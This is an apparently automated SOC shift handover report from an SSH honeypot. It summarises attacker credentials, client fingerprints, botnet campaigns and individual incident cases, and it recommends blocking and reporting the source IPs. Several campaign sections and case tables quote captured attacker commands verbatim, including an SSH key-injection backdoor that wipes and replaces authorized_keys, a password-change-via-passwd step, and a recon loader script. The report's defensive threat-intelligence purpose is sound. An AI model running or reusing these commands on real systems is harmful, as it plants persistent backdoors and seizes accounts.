# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-21 |
| **Generated At** | 2026-10-21T16:18:02Z |
| **Shift Time** | 16:18 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **336** |
| Confirmed Threats | **288** |
| False Positives Filtered | **48** (14.3%) |
| Unique Attacker IPs | **218** |
| Countries of Origin | **52** |
| High Severity Cases | **157** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **179** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **890** |
| Unique Credential Pairs | **513** |
| Unique Usernames | **80** |
| Unique Passwords | **425** |
| Successful Auth Pairs | **781** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 517 |
| `345gs5662d34` | 92 |
| `ubuntu` | 52 |
| `support` | 38 |
| `admin` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 93 |
| `345gs5662d34` | 92 |
| `support` | 26 |
| `123456` | 16 |
| `supportAtlanta` | 12 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 92 |
| `support` | `support` | 26 |
| `root` | `3245gs5662d34` | 24 |
| `support` | `supportAtlanta` | 12 |
| `admin` | `admin` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Asd12345` | `103.211.76.8` | 2026-10-21T00:55:41 |
| `root` | `hisco` | `10.0.0.73` | 2026-10-21T00:56:29 |
| `root` | `hisco` | `103.211.76.8` | 2026-10-21T00:57:40 |
| `root` | `hp123!@#` | `10.0.0.73` | 2026-10-21T00:58:27 |
| `root` | `hp123!@#` | `103.211.76.8` | 2026-10-21T00:59:38 |
| `root` | `sns123.,` | `10.0.0.73` | 2026-10-21T01:00:26 |
| `ubuntu` | `admin@123!` | `217.60.255.130` | 2026-10-21T01:00:50 |
| `root` | `hossein123` | `217.60.255.130` | 2026-10-21T01:00:54 |
| `root` | `sns123.,` | `103.211.76.8` | 2026-10-21T01:01:40 |
| `root` | `qwer1234!~` | `10.0.0.73` | 2026-10-21T01:02:28 |
| `root` | `qwer1234!~` | `103.211.76.8` | 2026-10-21T01:03:39 |
| `root` | `Zxcv1234!` | `10.0.0.73` | 2026-10-21T01:04:26 |
| `root` | `Zxcv1234!` | `103.211.76.8` | 2026-10-21T01:05:37 |
| `root` | `zaq1XSW@cde3` | `10.0.0.73` | 2026-10-21T01:06:24 |
| `security` | `123456` | `146.190.175.10` | 2026-10-21T01:06:51 |
| `345gs5662d34` | `345gs5662d34` | `146.190.175.10` | 2026-10-21T01:06:53 |
| `security` | `3245gs5662d34` | `146.190.175.10` | 2026-10-21T01:06:54 |
| `root` | `zaq1XSW@cde3` | `103.211.76.8` | 2026-10-21T01:07:37 |
| `support` | `support` | `10.0.0.73` | 2026-10-21T01:07:40 |
| `ubuntu` | `!QAZ@2wsx` | `217.60.255.130` | 2026-10-21T01:07:52 |
_… 761 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **336** |
| Sessions with Fingerprint | **31** |
| Unique HASSH Fingerprints | **31** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 127 |
| Go SSH scanner | 34 |
| OpenSSH | 10 |
| Unknown | 5 |
| PuTTY | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 95 | 51 |
| `03a80b21afa8...` | Modern SSH client | 12 | 6 |
| `2ec37a7cc8da...` | Mirai/variant | 7 | 3 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |
| `98f63c4d9c87...` | Generic scanner | 5 | 5 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 95 | 51 | Mirai/variant |
| `95420f9d932d...` | libssh | 14 | 7 | — |
| `03a80b21afa8...` | libssh | 12 | 6 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 7 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 5 | 5 | Generic scanner |
| `390ffe68a68c...` | OpenSSH | 5 | 2 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **18** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 68 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 49 | 48 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "1qaz@WSX\n4d2aNsTEFbgJ\n4d2aNsTEFbgJ"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `203.66.168.131`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.84`, `2.57.122.209`, `195.178.110.232`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `74.118.81.170`, `85.198.19.251`, `216.126.225.6`, `58.186.20.143`, `189.204.230.91`, `118.139.164.171`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **218** |
| Unique ASNs | **124** |
| High-Risk ASNs | **91** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 46 | HIGH |
| `AS396982` | Google LLC | 10 | HIGH |
| `AS14061` | DigitalOcean, LLC | 6 | HIGH |
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 3 | HIGH |
| `AS12389` | PJSC Rostelecom | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (152)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-295abc9d95b1

| Field | Detail |
|---|---|
| **Source IP** | `103.211.76[.]8` |
| **First Seen** | 2026-10-21 00:55 |
| **Last Seen** | 2026-10-21 00:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 00:55:40` | `cowrie.session.connect` |
| `2026-10-21 00:55:40` | `cowrie.client.version` |
| `2026-10-21 00:55:41` | `cowrie.client.kex` |
| `2026-10-21 00:55:41` | `cowrie.login.success` |
| `2026-10-21 00:55:42` | `cowrie.session.params` |
| `2026-10-21 00:55:42` | `cowrie.command.input` |
| `2026-10-21 00:55:43` | `cowrie.log.closed` |
| `2026-10-21 00:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.76[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.211.76[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c17e05458bf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-10-21 01:00 |
| **Last Seen** | 2026-10-21 01:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 01:00:49` | `cowrie.session.connect` |
| `2026-10-21 01:00:49` | `cowrie.client.version` |
| `2026-10-21 01:00:49` | `cowrie.client.kex` |
| `2026-10-21 01:00:50` | `cowrie.login.success` |
| `2026-10-21 01:00:50` | `cowrie.direct-tcpip.request` |
| `2026-10-21 01:00:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-10-21 01:00:50` | `cowrie.direct-tcpip.data` |
| `2026-10-21 01:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de386294676a

| Field | Detail |
|---|---|
| **Source IP** | `146.190.175[.]10` |
| **First Seen** | 2026-10-21 01:06 |
| **Last Seen** | 2026-10-21 01:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 01:06:51` | `cowrie.session.connect` |
| `2026-10-21 01:06:51` | `cowrie.client.version` |
| `2026-10-21 01:06:51` | `cowrie.client.kex` |
| `2026-10-21 01:06:51` | `cowrie.login.success` |
| `2026-10-21 01:06:52` | `cowrie.session.params` |
| `2026-10-21 01:06:52` | `cowrie.command.input` |
| `2026-10-21 01:06:52` | `cowrie.command.failed` |
| `2026-10-21 01:06:52` | `cowrie.log.closed` |
| `2026-10-21 01:06:53` | `cowrie.session.params` |
| `2026-10-21 01:06:53` | `cowrie.command.input` |
| `2026-10-21 01:06:53` | `cowrie.session.file_download` |
| `2026-10-21 01:06:53` | `cowrie.log.closed` |
| `2026-10-21 01:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.190.175[.]10` to AbuseIPDB if not already reported
- [ ] Block `146.190.175[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1be1c2e0db84

| Field | Detail |
|---|---|
| **Source IP** | `146.190.175[.]10` |
| **First Seen** | 2026-10-21 01:06 |
| **Last Seen** | 2026-10-21 01:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 01:06:53` | `cowrie.session.connect` |
| `2026-10-21 01:06:53` | `cowrie.client.version` |
| `2026-10-21 01:06:53` | `cowrie.client.kex` |
| `2026-10-21 01:06:53` | `cowrie.login.success` |
| `2026-10-21 01:06:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.190.175[.]10` to AbuseIPDB if not already reported
- [ ] Block `146.190.175[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a954b2ab0e51

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-10-21 01:15 |
| **Last Seen** | 2026-10-21 01:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 01:15:52` | `cowrie.session.connect` |
| `2026-10-21 01:15:52` | `cowrie.client.version` |
| `2026-10-21 01:15:52` | `cowrie.client.kex` |
| `2026-10-21 01:15:54` | `cowrie.login.success` |
| `2026-10-21 01:15:55` | `cowrie.session.params` |
| `2026-10-21 01:15:55` | `cowrie.command.input` |
| `2026-10-21 01:15:55` | `cowrie.command.input` |
| `2026-10-21 01:15:55` | `cowrie.command.input` |
| `2026-10-21 01:15:56` | `cowrie.command.input` |
| `2026-10-21 01:15:56` | `cowrie.command.input` |
| `2026-10-21 01:15:56` | `cowrie.command.success` |
| `2026-10-21 01:15:56` | `cowrie.command.input` |
| `2026-10-21 01:15:56` | `cowrie.command.input` |
| `2026-10-21 01:15:56` | `cowrie.command.input` |
| `2026-10-21 01:15:56` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7de60f5238b0

| Field | Detail |
|---|---|
| **Source IP** | `87.251.64[.]124` |
| **First Seen** | 2026-10-21 01:31 |
| **Last Seen** | 2026-10-21 01:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0[.]0 Safari/537.36, Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7, Accept-Encoding: gzip, deflate, br, Accept-Language: en-US,en;q=0.9, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 01:31:06` | `cowrie.session.connect` |
| `2026-10-21 01:31:06` | `cowrie.login.success` |
| `2026-10-21 01:31:07` | `cowrie.session.params` |
| `2026-10-21 01:31:07` | `cowrie.command.input` |
| `2026-10-21 01:31:07` | `cowrie.command.input` |
| `2026-10-21 01:31:07` | `cowrie.command.failed` |
| `2026-10-21 01:31:07` | `cowrie.command.input` |
| `2026-10-21 01:31:07` | `cowrie.command.failed` |
| `2026-10-21 01:31:07` | `cowrie.command.input` |
| `2026-10-21 01:31:07` | `cowrie.command.failed` |
| `2026-10-21 01:31:07` | `cowrie.command.input` |
| `2026-10-21 01:31:07` | `cowrie.command.failed` |
| `2026-10-21 01:31:07` | `cowrie.command.input` |
| `2026-10-21 01:31:07` | `cowrie.log.closed` |
| `2026-10-21 01:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.251.64[.]124` to AbuseIPDB if not already reported
- [ ] Block `87.251.64[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26d6f260fa22

| Field | Detail |
|---|---|
| **Source IP** | `103.211.76[.]8` |
| **First Seen** | 2026-10-21 02:01 |
| **Last Seen** | 2026-10-21 02:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 02:01:12` | `cowrie.session.connect` |
| `2026-10-21 02:01:12` | `cowrie.client.version` |
| `2026-10-21 02:01:12` | `cowrie.client.kex` |
| `2026-10-21 02:01:13` | `cowrie.login.success` |
| `2026-10-21 02:01:14` | `cowrie.session.params` |
| `2026-10-21 02:01:14` | `cowrie.command.input` |
| `2026-10-21 02:01:14` | `cowrie.log.closed` |
| `2026-10-21 02:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.76[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.211.76[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f695dec413

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-10-21 02:01 |
| **Last Seen** | 2026-10-21 02:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 02:01:32` | `cowrie.session.connect` |
| `2026-10-21 02:01:32` | `cowrie.client.version` |
| `2026-10-21 02:01:32` | `cowrie.client.kex` |
| `2026-10-21 02:01:33` | `cowrie.login.success` |
| `2026-10-21 02:01:34` | `cowrie.session.params` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| `2026-10-21 02:01:34` | `cowrie.command.success` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| `2026-10-21 02:01:34` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7675e6b063b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-10-21 02:05 |
| **Last Seen** | 2026-10-21 02:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 02:05:13` | `cowrie.session.connect` |
| `2026-10-21 02:05:13` | `cowrie.client.version` |
| `2026-10-21 02:05:13` | `cowrie.client.kex` |
| `2026-10-21 02:05:14` | `cowrie.login.success` |
| `2026-10-21 02:05:14` | `cowrie.direct-tcpip.request` |
| `2026-10-21 02:05:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-10-21 02:05:14` | `cowrie.direct-tcpip.data` |
| `2026-10-21 02:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f2d9608a15a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-21 02:31 |
| **Last Seen** | 2026-10-21 02:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 02:31:04` | `cowrie.session.connect` |
| `2026-10-21 02:31:04` | `cowrie.client.version` |
| `2026-10-21 02:31:04` | `cowrie.client.kex` |
| `2026-10-21 02:31:05` | `cowrie.login.success` |
| `2026-10-21 02:31:05` | `cowrie.direct-tcpip.request` |
| `2026-10-21 02:31:05` | `cowrie.direct-tcpip.data` |
| `2026-10-21 02:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b3b5ac0c419

| Field | Detail |
|---|---|
| **Source IP** | `45.17.39[.]120` |
| **First Seen** | 2026-10-21 02:53 |
| **Last Seen** | 2026-10-21 02:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 02:53:23` | `cowrie.session.connect` |
| `2026-10-21 02:53:23` | `cowrie.client.version` |
| `2026-10-21 02:53:23` | `cowrie.client.kex` |
| `2026-10-21 02:53:23` | `cowrie.login.success` |
| `2026-10-21 02:53:24` | `cowrie.session.params` |
| `2026-10-21 02:53:24` | `cowrie.command.input` |
| `2026-10-21 02:53:24` | `cowrie.command.failed` |
| `2026-10-21 02:53:24` | `cowrie.log.closed` |
| `2026-10-21 02:53:25` | `cowrie.session.params` |
| `2026-10-21 02:53:25` | `cowrie.command.input` |
| `2026-10-21 02:53:25` | `cowrie.session.file_download` |
| `2026-10-21 02:53:25` | `cowrie.log.closed` |
| `2026-10-21 02:53:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.17.39[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.17.39[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8edfebda1fb8

| Field | Detail |
|---|---|
| **Source IP** | `45.17.39[.]120` |
| **First Seen** | 2026-10-21 02:53 |
| **Last Seen** | 2026-10-21 02:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-21 02:53:25` | `cowrie.session.connect` |
| `2026-10-21 02:53:25` | `cowrie.client.version` |
| `2026-10-21 02:53:25` | `cowrie.client.kex` |
| `2026-10-21 02:53:25` | `cowrie.login.success` |
| `2026-10-21 02:53:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.17.39[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.17.39[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-757c15ef8837

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
